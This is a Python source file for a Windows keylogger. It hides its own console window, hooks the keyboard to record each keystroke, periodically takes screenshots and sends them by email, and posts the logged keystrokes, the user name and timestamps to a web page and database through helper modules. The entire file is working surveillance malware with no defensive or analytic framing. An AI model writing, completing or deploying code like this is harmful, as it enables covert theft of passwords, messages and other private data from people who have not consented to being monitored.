import getpass
import keyboard
import threading
import win32gui, win32console
from datetime import datetime, date
from modules.screenshot import Screenshot
from modules.report import ReportToWebPage

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


class Keylogger:

    def __init__(self, interval, smtp_addr, email, password, url):

        self.smtp_addr = smtp_addr
        self.email = email
        self.password = password
        self.url = url
        self.interval = interval
        self.user = getpass.getuser()
        self.log = ""
        self.date = str(date.today())
        self.screenshot = Screenshot(interval=self.interval, smtp_addr=self.smtp_addr)

    def callback(self, event):

        name = event.name

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def send_log(self, user, log, date, heure):

        self.screenshot.get_screenshot()
        self.screenshot.send_by_mail(self.email, self.password)
        print("Screenshot envoyé !!!")

        self.r = ReportToWebPage(
            url=self.url,
            smtp_addr=self.smtp_addr,
            email=self.email,
            password=self.password,
            logger=log
        )
        self.r.send_to_db(user=user, log=log, date=date, hour=heure)

    def report(self):

        if self.log:

            self.heure = str(datetime.now())
            print(self.log)

            self.send_log(
                user=self.user,
                log=self.log,
                date=self.date,
                heure=self.heure
            )

        self.log = ""
        timer = threading.Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):

        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()
